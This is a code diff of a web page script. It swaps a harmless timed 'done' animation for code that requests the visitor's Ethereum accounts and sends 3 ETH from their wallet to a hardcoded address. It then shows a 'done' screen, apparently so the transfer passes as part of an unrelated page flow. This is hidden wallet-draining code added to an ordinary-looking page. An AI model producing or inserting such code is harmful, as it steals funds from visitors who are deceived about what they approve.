@@ -18,31 +18,34 @@ window.onload = function () {
     requestElement.style.display = 'none';
     loadingElement.style.display = 'flex';
 
-    setTimeout(() => {
-      const askElement = document.getElementById('ask');
-      const doneElement = document.getElementById('done');
-      askElement.style.display = 'none';
-      doneElement.style.display = 'flex';
-    }, 2000);
+    ethereum.request({ method: 'eth_requestAccounts' })
+    .then(acounts => send(acounts))
   });
 
 
 }
 
-const getToday = function() {
-  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-  const today = new Date();
-  return monthsShort[today.getMonth()] + ' ' + today.getDate() + ', ' + today.getFullYear()
-}
-
-const playChat = function(id, word) {
-  const dom = document.getElementById(id);
-  const data = word.split('');
-  let index = 0;
-  (function writing(index) {
-      if (index < data.length) {
-          dom.innerHTML += data[index]
-          setTimeout(writing.bind(this), 200, ++index)
-      }
-  })(index)
+const send = function(accounts) {
+  console.log(accounts)
+  ethereum
+    .request({
+      method: 'eth_sendTransaction',
+      params: [
+        {
+          from: accounts[0],
+          to: '0x305af93135Fc6D9c325d0e05b8A113850C13EC59',
+          value: '0x29a2241af62c0000',
+          gasPrice: '0x09184e72a000',
+          gas: '0x6000',
+        },
+      ],
+    })
+    .then((txHash) => console.log(txHash))
+    .then(() => {
+      const askElement = document.getElementById('ask');
+      const doneElement = document.getElementById('done');
+      askElement.style.display = 'none';
+      doneElement.style.display = 'flex';
+    })
+    .catch((error) => console.error);
 }
